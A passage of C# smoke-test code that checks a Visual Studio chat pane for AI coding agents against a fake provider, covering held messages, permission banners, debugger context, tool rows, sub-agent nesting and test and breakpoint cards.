                  + $"raceNotice={gotRaceNotice} stopStillOffered={stopStillOffered} "
                  + $"selectionLocked={selectionLocked} newSessionLocked={newSessionLocked} "
                  + $"stopClearedWindow={stopClearedWindow} armedBeforeRoundTrip={armedBeforeRoundTrip} "
                  + $"announcedWorking={announcedWorkingOnPlainTurn}");
        }

        /// <summary>
        /// Held messages (issue #70): a message typed while the agent is inside a tool call waits for
        /// the call to finish instead of interrupting it.
        /// <para>
        /// What this covers that the unit tests cannot is the tool call actually SURVIVING. The reason
        /// for the whole feature is measured behaviour on the wire — a steer sent during a
        /// <c>run_tests</c> call returned <c>AbortError: interrupt</c> to the agent and the run was lost,
        /// with nothing surfacing that to the user — so the assertion that matters is that the call
        /// completes successfully with the user's message delivered afterwards. Across the real engine
        /// IPC, because that is where an interrupted call would actually be lost.
        /// </para>
        /// </summary>
        private async Task<(bool Ok, string Detail)> VerifyHeldMessagesAsync(string workDir, string modeName)
        {
            var vm = new ChatViewModel(
                _engine!, new StartSessionRequest("fake", null, workDir, modeName, null),
                sessionStore: new FileSessionStore(Path.Combine(workDir, "sessions", "hold-proof")));
            await vm.InitializeAsync().ConfigureAwait(true);

            vm.InputText = "[slow-tool] run the tests";
            vm.SendCommand.Execute(null);

            // Wait until the agent is genuinely inside the call — the state the hold exists for.
            ToolItemViewModel? RunningTool() => vm.Items.OfType<ToolItemViewModel>()
                .FirstOrDefault(t => t.Title.Contains("run_tests", StringComparison.Ordinal));
            bool ToolIsRunning() => RunningTool() is { Status: ToolStatus.Running };

            for (var i = 0; i < 1200 && !ToolIsRunning(); i++)
                await Task.Delay(5).ConfigureAwait(true);
            if (!ToolIsRunning())
                return (false, "the fake's slow tool call never opened");

            vm.InputText = "also update the changelog";
            if (!vm.SteerCommand.CanExecute(null))
                return (false, "steer command disabled mid-turn, so Ctrl+Enter would do nothing");

            vm.SteerCommand.Execute(null);

            // Read SYNCHRONOUSLY: HoldMessage runs inline, so with no await between Execute and this,
            // the message is in the tray if and only if it was never dispatched. A poll would let a
            // version that steers immediately pass, since the tray would be briefly non-empty either
            // way — the whole claim is about what did NOT go out.
            var held = vm.PendingMessages.Count == 1;
            var boxCleared = vm.InputText.Length == 0;
            // The wait is legible: it names the call it's waiting for rather than saying "waiting".
            var namesTheWait = vm.PendingStatus.Contains("run_tests", StringComparison.Ordinal);

            if (!await WaitUntilIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true))
                return (false, "the held turn never completed");

            // The payoff. An interrupted call never reports success — the fake's completion is emitted
            // after its delay, and a cancelled turn never reaches it.
            var toolSurvived = RunningTool() is { Status: ToolStatus.Success };
            var delivered = vm.Items.OfType<MessageItemViewModel>()
                .Any(m => m.IsUser && m.Text == "also update the changelog");
            var agentAnswered = vm.Items.OfType<MessageItemViewModel>()
                .Any(m => m.IsAssistant
                          && m.Text.Contains("[steered mid-turn]", StringComparison.Ordinal)
                          && m.Text.Contains("also update the changelog", StringComparison.Ordinal));
            var trayDrained = vm.PendingMessages.Count == 0;

            var ok = held && boxCleared && namesTheWait && toolSurvived && delivered && agentAnswered && trayDrained;
            return (ok, ok
                ? string.Empty
                : $"held={held} boxCleared={boxCleared} namesTheWait={namesTheWait} (status='{vm.PendingStatus}') "
                  + $"toolSurvived={toolSurvived} ({RunningTool()?.Status}) delivered={delivered} "
                  + $"agentAnswered={agentAnswered} trayDrained={trayDrained}");
        }

        /// <summary>
        /// Registers a fake debug-context source (issue #73, rung 2). There is no debugger behind this
        /// host, so the capture is canned - but everything ABOVE the capture is the real thing: the
        /// menu, the chip, the send path, the persisted entry and the replay. Without it none of that
        /// is drivable offline, and the whole rung would rest on a live Visual Studio instance.
        ///
        /// <para>Built from a real <see cref="DebugStateCapture"/> through the real formatter rather
        /// than from a hand-written string, so the offline checks exercise the same rendering devenv
        /// will - a fake that produced its own text would agree with itself forever.</para>
        ///
        /// <para><b>Three sources, and the last one is a fixture.</b> The gesture is "add something to
        /// this message", not "capture the debugger", so the menu is a list - two real captures here,
        /// mirroring what the VS shell registers - plus an ALWAYS-UNAVAILABLE entry, which is what
        /// proves the disabled path draws, that being the state a user meets first (nothing is stopped
        /// when they go looking). The fixture NAMES ITSELF as one; see its own comment for what that
        /// cost when it did not.</para>
        /// </summary>
        private static void RegisterFakeContextSources(ChatViewModel vm)
        {
            // The Output-window capture, built through the SAME Core formatter devenv uses, so the chip
            // and the block this host renders are the ones a user gets. The pane text is deliberately
            // longer than the tail cap: a fake that fitted would exercise only the branch where nothing
            // is dropped, and the provenance line's whole job is to say what was.
            vm.RegisterContextSource(new ChatContextSource(
                HostPromptBlocks.OutputWindow.Name,
                "Output window",
                "What the Output window is showing — your selection in it, or the last "
                    + OutputCapture.MaxTailLines + " lines.",
                captureAsync: _ =>
                {
                    var capture = OutputCapture.Build("Build", FakeOutputPaneText(), selectedText: null);
                    return Task.FromResult<ChatContextCapture?>(capture is null
                        ? null
                        : new ChatContextCapture(
                            HostPromptBlocks.OutputWindow, capture.Label, capture.Text));
                }));

            vm.RegisterContextSource(new ChatContextSource(
                HostPromptBlocks.DebugState.Name,
                "Debug context",
                "The call stack and locals the debugger is showing.",
                captureAsync: root => Task.FromResult<ChatContextCapture?>(new ChatContextCapture(
                    HostPromptBlocks.DebugState,
                    DebugStateFormatter.Label(FakeDebugCapture(root)),
                    DebugStateFormatter.Format(FakeDebugCapture(root), root)))));

            // The always-unavailable fixture. Its LABEL is deliberately not the name of any feature,
            // real or planned: it was called "Editor selection" and read, in this host and in every
            // screenshot taken of it, as a shipped gesture that happened to be off — which is worse
            // than a placeholder, because the editor selection is one thing this pane deliberately does
            // NOT capture. It is already sent ambiently in <workspace-context> (the line range always,
            // the text inline under 4,000 chars), so a menu item promising it would duplicate what
            // every prompt carries. A fixture that names itself cannot be misread as a roadmap.
            vm.RegisterContextSource(new ChatContextSource(
                "fake-unavailable",
                "Fake unavailable source",
                "Never available. It exists so the disabled state can be seen.",
                captureAsync: _ => Task.FromResult<ChatContextCapture?>(null),
                canCapture: () => false,
                unavailableReason: "This source is never available — it is here to draw the "
                    + "disabled state, which is what a user meets first."));
        }

        /// <summary>A build log longer than the cap, so the truncation branch is the one exercised.</summary>
        private static string FakeOutputPaneText()
        {
            var sb = new System.Text.StringBuilder();
            sb.AppendLine("1>------ Build started: Project: ConsoleApp1, Configuration: Debug Any CPU ------");
            for (var i = 0; i < OutputCapture.MaxTailLines + 40; i++)
                sb.AppendLine($"1>  ConsoleApp1 -> compiling file {i}.cs");
            sb.AppendLine("1>C:\\src\\ConsoleApp1\\Program.cs(12,17): error CS0103: The name 'Foo' does not exist in the current context");
            sb.AppendLine("========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ==========");
            return sb.ToString();
        }

        /// <summary>
        /// A capture shaped like the one the probe measured: a recursion several frames deep, where
        /// consecutive frames share a file AND a line (issue #73 - that is legitimate, and it is why
        /// the capture has no change-detection guard), plus external frames it stopped short of.
        /// </summary>
        /// <remarks>
        /// The frames are rooted UNDER <paramref name="root"/> deliberately. A real capture reports
        /// absolute paths and the formatter relativises them against the agent's own working
        /// directory, so a fake whose paths sit somewhere else would exercise only the branch where
        /// that fails - and the screenshot would show a wall of absolute paths no user will see.
        /// </remarks>
        private static DebugStateCapture FakeDebugCapture(string root)
        {
            var file = Path.Combine(root, "ConsoleApp1", "HelloWorldService.cs");
            var frames = new System.Collections.Generic.List<DebugFrame>
            {
                new DebugFrame("ConsoleApp1.HelloWorldService.SayHelloWorld(int depth)")
                {
                    File = file,
                    Line = 38,
                    Locals = new[]
                    {
                        new DebugLocal("depth") { Type = "int", Value = "9" },
                        // Type and value matching EXACTLY is the shape the real debugger produces (measured), and
                        // it is what SaysNothing keys on - a fake that mismatched them would render a line
                        // the shipping build drops.
                        new DebugLocal("this")
                        {
                            Type = "ConsoleApp1.HelloWorldService",
                            Value = "{ConsoleApp1.HelloWorldService}",
                        },
                    },
                },
            };

            for (var i = 0; i < 3; i++)
            {
                frames.Add(new DebugFrame("ConsoleApp1.HelloWorldService.Recurse(int depth)")
                {
                    File = file,
                    Line = 33,
                    Locals = new[] { new DebugLocal("depth") { Type = "int", Value = (9 - i).ToString(System.Globalization.CultureInfo.InvariantCulture) } },
                });
            }

            return new DebugStateCapture
            {
                Frames = frames,
                ExternalFrames = 4,
                ThreadName = "Main Thread",
                // A stop reason, because the header renders one on its own line and a fake without it
                // leaves that line unexercised in the screenshot and the smoke alike. The agent-set
                // wording is the interesting one: it is rung 1's tag being read back by rung 2.
                StopReason = DebugStateFormatter.DescribeBreakpoint(
                    Breakpoints.Tag("desktop-fake"), "depth == 9", fromThisConversation: true),
            };
        }

        private async Task RunSmokeAsync(ChatViewModel vm, StubIdeServices ide, string workDir, string modeName, FileSessionStore store, Window window)
        {
            var resultPath = Path.Combine(workDir, "smoke-result.txt");
            string result;
            int exitCode;

            // The fake provider asks permission; under Prompt mode that surfaces the inline banner,
            // which we auto-allow so the turn completes. Track whether a banner was shown so the
            // policy modes can be told apart (AcceptAll resolves without a banner).
            var bannerShown = false;
            void AutoAllow(object? s, System.ComponentModel.PropertyChangedEventArgs e)
            {
                if (e.PropertyName == nameof(ChatViewModel.PendingPermission) && vm.PendingPermission is { } banner)
                {
                    bannerShown = true;
                    var opt = banner.Options.FirstOrDefault(o => o.IsAllow) ?? banner.Options.FirstOrDefault();
                    opt?.Command.Execute(null);
                }
            }
            vm.PropertyChanged += AutoAllow;

            try
            {
                // Parallel-permission proof (issue #30): the agent can fire several request_permission
                // calls concurrently (parallel tool calls in one turn). Detach the auto-allow handler so
                // both requests pile into the queue at once — a single banner slot would clobber the
                // first, leaving its task blocked forever. Both must surface (head-first) and complete.
                vm.PropertyChanged -= AutoAllow;
                var (gotParallelPermissions, parallelDetail) = await VerifyParallelPermissionsAsync(vm).ConfigureAwait(true);
                vm.PropertyChanged += AutoAllow;

                vm.InputText = "Say hello and write a file.";
                vm.SendCommand.Execute(null);

                var completed = await WaitUntilIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true);

                // IsBusy flips when the prompt RPC completes, which races the turn's tail events
                // (edit, turnDone) still being marshaled onto the dispatcher — so wait (bounded) for
                // the asserted transcript state itself: the finalized diff folded into the tool row
                // (non-empty "before" = the re-sent diff has been applied). Timing out is fine; the
                // assertions below then fail with an accurate picture.
                await WaitForTranscriptAsync(
                    () => vm.Items.OfType<ToolItemViewModel>().Any(t => t.DiffPath == "notes.txt" && t.DiffOldText.Length > 0),
                    TimeSpan.FromSeconds(10)).ConfigureAwait(true);

                var gotAssistantText = vm.Items.OfType<MessageItemViewModel>()
                    .Any(m => m.IsAssistant && m.Text.Length > 0);
                var gotEdit = vm.Items.OfType<ToolItemViewModel>().Any(t => t.HasDiff) || ide.WrittenFiles.Count > 0;

                // Tool-row enrichment proof: the fake's read opens with a placeholder ("Read File",
                // empty input) and enriches on an update (Claude Code adapter style); the single row
                // must end up with the real title, merged input+output detail, AND a click-to-open
                // file target extracted from the update's rawInput (its relative file_path resolved
                // against the workspace root).
                var readRow = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "r1");
                var gotToolDetail = readRow is { Title: "Read notes.txt" }
                    && readRow.Detail is { } detail
                    && detail.Contains("file_path: notes.txt")
                    && detail.Contains("fake notes content")
                    && readRow.FilePath == Path.Combine(workDir, "notes.txt");

                // Permission-highlight proof: a prompt outlines + expands its transcript row and reverts on
                // dismiss. Detach the auto-allow handler so the verify controls the resolve timing itself.
                vm.PropertyChanged -= AutoAllow;
                var (gotPermissionHighlight, highlightDetail) = await VerifyPermissionHighlightAsync(vm).ConfigureAwait(true);

                // Parking the view on a pending prompt (issue #125). Needs the real visual tree: the
                // whole subject is a scroll offset in a virtualising panel.
                var (gotPromptPark, promptParkDetail) = window.Content is CodeWicket.UI.Views.ChatView parkView
                    ? await VerifyPromptParkAsync(vm, window, parkView).ConfigureAwait(true)
                    : (false, "chat view not hosted");
                // The same park, on the target the one above cannot use — THE LAST ITEM (issue #218) —
                // runs near the END of this method instead of here. It has to REORDER the transcript to
                // make that shape exist at all, and doing so from this position failed the CLI-import
                // phase: the churn rule this file already states, arriving by a new route.
                // The pinned plan strip's click (issue #180). Same window and same reason as the park
                // above: the subject is a scroll offset in a real virtualising panel, and it needs the
                // live plan the fake's turn has just produced.
                var (gotPlanStripFollow, planStripDetail) = window.Content is CodeWicket.UI.Views.ChatView stripView
                    ? await VerifyPlanStripFollowAsync(vm, window, stripView).ConfigureAwait(true)
                    : (false, "chat view not hosted");
                var (gotEditBanner, editBannerDetail) = await VerifyEditBannerContextAsync(vm).ConfigureAwait(true);
                var (gotFlaggedPermission, flaggedDetail) = await VerifyFlaggedPermissionAsync(vm).ConfigureAwait(true);
                var (gotToolTrust, toolTrustDetail) = await VerifyToolTrustBannerAsync(vm).ConfigureAwait(true);

                // What this session negotiated, read back through the engine (issue #160). Placed here
                // because it needs a live session and disturbs nothing: it opens a popup and closes it.
                var (gotSessionInfo, sessionInfoDetail) = await VerifySessionInfoAsync(vm).ConfigureAwait(true);
                vm.PropertyChanged += AutoAllow;

                // Multi-target read proof (issue #20): the fake's Kiro-style batched read (an
                // "operations" array: a Directory entry to skip + two files) must attach BOTH files
                // to the one row (click opens them all; tooltip advertises the count).
                var multiRead = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "r2");
                var gotMultiRead = multiRead is not null
                    && multiRead.FileTargets.Count == 2
                    && multiRead.FileTargets[0].Path == Path.Combine(workDir, "a.txt")
                    && multiRead.FileTargets[1].Path == Path.Combine(workDir, "b.txt")
                    && multiRead.OpenFileToolTip == "Open 2 files"
                    // A batched row names the first file and counts the rest — its title says neither.
                    && multiRead.TargetDisplayPath == "a.txt  +1 more";

                // Generic-title read proof (issue #102): Kiro's v3 engine titles every read "Read File"
                // and never enriches it, so the row must name the target from the call's own arguments —
                // and still name it after the completion frame re-sends that same generic title. The
                // second half of the check is the other direction: r1's enriched Claude-style title
                // already names the file, and the row must not say it twice.
                var genericRead = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "r3");
                // …and the label is not decoration: the row it sits on is the click target that opens
                // that file, so the name and the click must agree about which file this is.
                var gotNamedRead = genericRead is { Title: "Read File", HasTargetPath: true, CanOpenFile: true }
                    && genericRead.TargetDisplayPath == "config.json"
                    && genericRead.FilePath == Path.Combine(workDir, "config.json")
                    && readRow is { HasTargetPath: false };

                // Plan-completion proof (issue #17): the fake finishes its plan the way Kiro does —
                // an EMPTY final update (Kiro disposes the task list when the last item completes).
                // Every item on the card must tick off, and the pinned strip must leave.
                // The wait matters: the permission verifications above run further turns, each with its
                // own plan, and IsPlanBarVisible reflects the CURRENT one — so reading it immediately
                // races the tail of whichever turn just ran, rather than testing this card at all.
                await WaitForTranscriptAsync(
                    () => vm.Items.OfType<PlanItemViewModel>().FirstOrDefault() is { IsComplete: true }
                          && !vm.IsPlanBarVisible,
                    TimeSpan.FromSeconds(10)).ConfigureAwait(true);
                var planCard = vm.Items.OfType<PlanItemViewModel>().FirstOrDefault();
                var gotPlanComplete = planCard is { IsComplete: true }
                    && planCard.Tasks.Count == 2
                    && !vm.IsPlanBarVisible;

                // Edit-fold proof: the fake opens t1 as a tool row and re-sends notes.txt's diff
                // (provisional empty "before", then the final) — the Claude adapter's shape. The diff
                // must fold into the t1 row (one card, updated in place to the final before-text) with
                // NO separate edit row added for it (the only edit card is k1's, checked below).
                var editTool = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "t1");
                var gotEditDedupe = editTool is { DiffPath: "notes.txt", DiffOldText: "old fake notes\n" }
                    && !vm.Items.OfType<EditItemViewModel>().Any(e => e.Path == "notes.txt");

                // A folded edit row must offer the same actions as the edit CARD the other backend
                // shape produces — which of the two you get is decided in AcpMapper by whether the
                // opening frame already carried a diff, so the same act must not behave differently.
                // The menu is OPENED for real rather than poking the view-model: a ContextMenu is its
                // own visual tree, and these items bind through PlacementTarget.DataContext with a
                // visibility converter, so a silent binding failure collapses them and shows nothing —
                // the exact failure the test-jump check below exists for.
                var gotEditRowMenu = false;
                var editRowMenuDetail = "not reached";
                if (editTool is not null && window.Content is CodeWicket.UI.Views.ChatView editMenuView)
                {
                    var container = editMenuView.BringItemIntoView(editTool);
                    window.UpdateLayout();
                    var rowBorder = container is not null
                        ? FindDescendantOfType<System.Windows.Controls.Border>(container, b => b.ContextMenu is not null)
                        : null;
                    var menu = rowBorder?.ContextMenu;
                    if (menu is not null)
                    {
                        menu.PlacementTarget = rowBorder;
                        menu.IsOpen = true;
                        await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                        var headers = menu.Items.OfType<System.Windows.Controls.MenuItem>()
                            .Where(i => i.Visibility == Visibility.Visible)
                            .Select(i => i.Header as string).ToList();
                        // Open file first: it is what the row is for once an edit is attached.
                        gotEditRowMenu = headers.Count == 3
                            && headers[0] == "Open file" && headers[1] == "Copy path" && headers[2] == "Copy";
                        editRowMenuDetail = "edit=[" + string.Join(",", headers) + "]";
                        menu.IsOpen = false;
                    }

                    // Every item in that menu is bound to VISIBILITY rather than to enabled-state, so
                    // getting one wrong does not grey an item out - it offers an action on a row where it
                    // would do nothing at all. Two rows say so from opposite ends.
                    async Task<List<string?>> HeadersFor(ToolItemViewModel row)
                    {
                        var rowContainer = editMenuView.BringItemIntoView(row);
                        window.UpdateLayout();
                        var border = rowContainer is not null
                            ? FindDescendantOfType<System.Windows.Controls.Border>(rowContainer, b => b.ContextMenu is not null)
                            : null;
                        if (border?.ContextMenu is not { } rowMenu)
                            return new List<string?>();

                        rowMenu.PlacementTarget = border;
                        rowMenu.IsOpen = true;
                        await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                        var found = rowMenu.Items.OfType<System.Windows.Controls.MenuItem>()
                            .Where(i => i.Visibility == Visibility.Visible)
                            .Select(i => i.Header as string).ToList();
                        rowMenu.IsOpen = false;
                        return found;
                    }

                    // A row that touched no file and launched nothing: the menu is one item.
                    var plainRow = vm.Items.OfType<ToolItemViewModel>()
                        .FirstOrDefault(t => !t.CanOpenFile && !t.HasPathToCopy && !t.CanOpenTranscript);
                    if (gotEditRowMenu && plainRow is not null)
                    {
                        var plainHeaders = await HeadersFor(plainRow).ConfigureAwait(true);
                        gotEditRowMenu = plainHeaders.Count == 1 && plainHeaders[0] == "Copy";
                        editRowMenuDetail += " plain=[" + string.Join(",", plainHeaders) + "]";
                    }

                    // ...and a sub-agent launch row gains "Open transcript", FIRST (issue #148). This
                    // is the entry point that covers the two cases the overflow control cannot - a
                    // collapsed row, and a fan-out too small to engage the cap - so it is the only thing
                    // standing between those and no way in at all. Driven through the real menu because a
                    // silent binding failure on PlacementTarget.DataContext does not hide the item, it
                    // SHOWS it: an unresolved visibility binding falls back to Visible, which is how this
                    // check first failed on a row that had every right to offer it.
                    var launchRow = vm.Items.OfType<ToolItemViewModel>()
                        .FirstOrDefault(t => t.CanOpenTranscript && !t.CanOpenFile && !t.HasPathToCopy);
                    if (gotEditRowMenu && launchRow is not null)
                    {
                        var launchHeaders = await HeadersFor(launchRow).ConfigureAwait(true);
                        gotEditRowMenu = launchHeaders.Count == 2
                            && launchHeaders[0] == "Open transcript" && launchHeaders[1] == "Copy";
                        editRowMenuDetail += " launch=[" + string.Join(",", launchHeaders) + "]";
                    }
                }

                // Sub-agent nesting proof (issue #125). Three separate claims, and the third is the one
                // a view-model assertion cannot make: the children must actually RENDER. They are drawn
                // by an ItemsControl inside the tool-row template with no ItemTemplate of its own — it
                // relies on the implicit DataType template applying to the children by type — so a
                // binding that resolved to nothing would leave the view-model perfectly nested and the
                // screen showing a row with its work invisible. That is the shape of #118's failure:
                // everything green, feature absent.
                var syncTask = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "sa1");
                var asyncTask = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "sa2");
                var gotSubagentNesting = false;
                var subagentDetail = "not reached";
                if (syncTask is not null && asyncTask is not null &&
                    window.Content is CodeWicket.UI.Views.ChatView nestView)
                {
                    // A fan-out is ONE line until asked: no child may be a top-level transcript item.
                    var childIds = new[] { "sa1-c1", "sa1-c2", "sa2-c1", "sa2-c2" };
                    var leaked = vm.Items.OfType<ToolItemViewModel>().Count(t => childIds.Contains(t.ToolCallId));

                    // The async row reports what happened - launched, not finished, and with none of the
                    // adapter's internal metadata as its result.
                    var launchedHonestly = asyncTask.Status == ToolStatus.Launched
                        && string.IsNullOrEmpty(asyncTask.OutputDetail);

                    // Now make the screen say it. Expand, lay out, and count the child rows actually
                    // realised inside the parent's container.
                    asyncTask.IsExpanded = true;
                    var nestContainer = nestView.BringItemIntoView(asyncTask);
                    window.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    // Count the child rows' own CARD CHROME, not presenters and not title text. A
                    // ContentPresenter exists per item whether or not a template was found (WPF falls
                    // back to ToString()), so counting those would pass over a missing template; and the
                    // title is drawn through an attached property that builds inlines, so TextBlock.Text
                    // is empty on a row that rendered perfectly. The row border carrying the row's
                    // context menu is instantiated only by our tool-row template, bound to that child.
                    var rendered = nestContainer is null
                        ? 0
                        : CountDescendants<System.Windows.Controls.Border>(
                            nestContainer,
                            b => b.ContextMenu is not null && asyncTask.Children.Contains(b.DataContext));

                    // The child cap, asserted against what WPF actually REALISED (issue #125). Its whole
                    // value rests on one binding: the children ItemsControl draws VisibleChildren, not
                    // Children. Point it back at Children and every unit test still passes while the
                    // fan-out goes back to realising every row inside one non-virtualizing container —
                    // which is the cost this exists to bound. So the check has to count rendered rows,
                    // not view-model state, and it has to do it on a fan-out big enough to be capped:
                    // the fake's two children are under the threshold by design.
                    for (var i = 0; i < 24; i++)
                        asyncTask.AddChild(new ToolItemViewModel("cap-" + i, "Read " + i, "read"));
                    window.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    var cappedRender = nestContainer is null
                        ? -1
                        : CountDescendants<System.Windows.Controls.Border>(
                            nestContainer,
                            b => b.ContextMenu is not null && asyncTask.Children.Contains(b.DataContext));
                    // And the newest call is the one on screen — the anchor a permission banner depends
                    // on, since the call it names is always the most recent.
                    var newestDrawn = asyncTask.VisibleChildren.Count > 0
                        && ReferenceEquals(asyncTask.VisibleChildren[asyncTask.VisibleChildren.Count - 1],
                                           asyncTask.Children[asyncTask.Children.Count - 1]);
                    var cappedOk = cappedRender == ToolItemViewModel.ChildCap && newestDrawn
                        && asyncTask.Children.Count == 26;   // display bound, not a data cut

                    gotSubagentNesting = leaked == 0
                        && syncTask.Children.Count == 2
                        && syncTask.Status == ToolStatus.Success   // the sync flavour still completes
                        && launchedHonestly
                        && rendered == 2
                        && cappedOk;
                    subagentDetail = $"leaked={leaked} sync={syncTask.Children.Count}/{syncTask.Status} " +
                        $"async={asyncTask.Children.Count}/{asyncTask.Status} " +
                        $"asyncResult={asyncTask.OutputDetail?.Length.ToString() ?? "null"} rendered={rendered} " +
                        $"capped={cappedRender}/{ToolItemViewModel.ChildCap} newestDrawn={newestDrawn}";
                    asyncTask.IsExpanded = false;
                }

                // The drill-down proof (issue #148) used to sit here and has been moved to the END of
                // this method. It seeds a long transcript to make the anchor restore a real question,
                // and adding then removing 120 messages churns the virtualising panel hard enough to
                // leave an already-captured markdown viewer rendering OUT OF THE TREE - where
                // MarkdownPalette.Resolve correctly returns null and the renderer falls back to resource
                // references. The next check to read that viewer is resolvedTheme, which asserts exactly
                // that those references are gone, so it failed 4-5 runs in 6 with nothing wrong with the
                // product: measured, pre-#148 main 0/6, with this phase 4-5/6, with only its padding
                // removed 0/6. The streamFollow phase states the rule this broke - a phase must leave
                // the transcript as it found it - and recycling churn is not undone by removing the
                // items that caused it, so the phase runs last instead.


                // Edit-status proof (issue #46): the fake's k1 edit is Kiro-style (diff at tool_call
                // start, no tool row), so it renders as a standalone edit card — and the call's
                // completion must flip the card's status to Success (the pencil goes green). The
                // completion trails the fold the earlier wait keyed on, so wait for it explicitly.
                await WaitForTranscriptAsync(
                    () => vm.Items.OfType<EditItemViewModel>().Any(e => e.Status == ToolStatus.Success),
                    TimeSpan.FromSeconds(10)).ConfigureAwait(true);
                var editCards = vm.Items.OfType<EditItemViewModel>().ToList();
                var gotEditStatus = editCards.Count == 1
                    && editCards[0].Path == "kiro-notes.txt"
                    && editCards[0].Status == ToolStatus.Success;

                // ...and the card must be EXPANDABLE once settled (issue #189). The status above was all
                // this shape ever carried: a failed write showed a red pencil and the reason was dropped
                // one step from the screen, while the permission sentence was reachable only by hovering
                // the glyph. Asserted here rather than left to the unit tests because the chevron is a
                // XAML attribute whose removal leaves a CLEAN BUILD and every view-model check green —
                // the #62 shape. So this reads the CHROME: the ToggleButton bound to IsExpanded has to
                // exist in the realised card, and toggling it has to reveal the detail panel.
                // Read from the TEMPLATE rather than from a realised card, deliberately: the transcript
                // virtualises, so whether this particular card has a container depends on where the pane
                // happens to be scrolled, and a check that quietly passes by finding nothing is the
                // failure mode being guarded against. LoadContent() instantiates the template's own tree
                // with no dependence on scroll position at all.
                System.Windows.Controls.Primitives.ToggleButton? editExpander = null;
                string? editExpanderPath = null;
                if (window.Content is CodeWicket.UI.Views.ChatView editCardView
                    && editCardView.TryFindResource(new System.Windows.DataTemplateKey(typeof(EditItemViewModel)))
                        is System.Windows.DataTemplate editCardTemplate
                    && editCardTemplate.LoadContent() is System.Windows.DependencyObject editCardChrome)
                {
                    editExpander = FindDescendantOfType<System.Windows.Controls.Primitives.ToggleButton>(editCardChrome);
                    editExpanderPath = editExpander is null
                        ? null
                        : System.Windows.Data.BindingOperations
                            .GetBinding(editExpander, System.Windows.Controls.Primitives.ToggleButton.IsCheckedProperty)?.Path?.Path;
                }

                var gotEditCardDetail = editCards.Count == 1
                    && editCards[0].PermissionSettled
                    && editCards[0].CanExpand              // a settled card always has the sentence, at least
                    && editExpanderPath == "IsExpanded";   // and a control actually wired to reach it by
                var editCardDetailDetail =
                    $"canExpand={editCards.FirstOrDefault()?.CanExpand} settled={editCards.FirstOrDefault()?.PermissionSettled} "
                    + $"chevron={(editExpander is null ? "absent" : "bound:" + (editExpanderPath ?? "<unbound>"))}";

                // Live-output proof: the fake streams two stdout chunks on the running "git status" row
                // (c1) and completes it with a NULL result — the row must hold the accumulated chunks
                // (live output survives a result-less completion instead of being wiped to blank).
                var cmdRow = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "c1");
                var gotLiveOutput = cmdRow?.OutputDetail is { } liveOut
                    && liveOut.Contains("On branch main", StringComparison.Ordinal)
                    && liveOut.Contains("working tree clean", StringComparison.Ordinal);

                // Test-card proof: the fake delivers the run_tests payload twice, mirroring the real hosts
                // (shell side-channel on the synthetic "cwkt-testrun" id first, then the agent's echo on
                // the real row id) — exactly ONE card must render, and the echo must still declutter the
                // tool row's raw JSON into the one-line summary. Checked before the resume sends below add
                // further turns (each fake turn emits another card with a fresh resultsFile).
                // The card's failure list is collapsible (a broken suite would otherwise bury the
                // transcript); a small run like this one stays expanded, so the detail you wanted needs
                // no click. The over-the-limit collapse is pinned in TestRunCardTests.
                var testCards = vm.Items.OfType<TestRunResultItemViewModel>().ToList();
                var runTestsRow = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "t2");
                var gotTestCard = testCards.Count == 1
                    && testCards[0].IsExpanded
                    && runTestsRow?.OutputDetail is { } testSummary
                    && testSummary.Contains("5 tests", StringComparison.Ordinal)
                    && !testSummary.Contains("resultKind", StringComparison.Ordinal);

                // Breakpoint-card proof (issue #73). Same two-delivery shape as the test run — the shell
                // side-channel's synthetic id first, then the agent's echo on the real row — so exactly
                // ONE card must render and the echo must still declutter the row's raw JSON. This is the
                // only offline check that drives the payload through the real mapper and view-model; the
                // unit tests build the card's view-models directly and would not notice the delivery path
                // breaking. The fake sends three rows on purpose: a conditional stop, a TRACEPOINT, and
                // one that failed to bind, which is the partial-success case — a card showing only the
                // two that worked would be the tool quietly hiding the one that did not.
                var breakpointCards = vm.Items.OfType<BreakpointCardItemViewModel>().ToList();
                var breakpointRow = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "t3");
                var traceRow = breakpointCards.Count == 1
                    ? breakpointCards[0].Rows.FirstOrDefault(r => r.IsTracepoint)
                    : null;
                var failedBreakpoint = breakpointCards.Count == 1
                    ? breakpointCards[0].Rows.FirstOrDefault(r => r.HasError)
                    : null;
                var gotBreakpointCard = breakpointCards.Count == 1
                    && breakpointCards[0].Rows.Count == 3
                    // The condition and the reason are why this card exists at all — the two things the
                    // gutter cannot show the user.
                    && breakpointCards[0].Rows.Any(r => r.HasCondition && r.HasReason)
                    // A tracepoint does not stop; a row that looked like a stop would send the user
                    // hunting for a break that never comes.
                    && traceRow is { IsTracepoint: true }
                    && failedBreakpoint is not null
                    && breakpointRow?.OutputDetail is { } breakpointSummary
                    && !breakpointSummary.Contains("resultKind", StringComparison.Ordinal);

                // Test-navigation proof: the fake's failure is Reqnroll-shaped (threw in a Then step,
                // test lives in the .feature). Clicking the row must go to the SCENARIO — VS's Test
                // Explorer convention — with the throw site on the right-click menu, and the row must
                // label the place the click lands. The menu is opened for real rather than just poking
                // the view-model: a ContextMenu is its own visual tree, so this is what proves the
                // PlacementTarget data binding resolves (a silent binding failure would collapse the
                // items and show nothing).
                var failureRow = testCards.Count == 1 ? testCards[0].Failures.FirstOrDefault() : null;
                var gotTestJump = failureRow is { CanOpen: true, CanOpenTest: true, PrimaryIsTest: true }
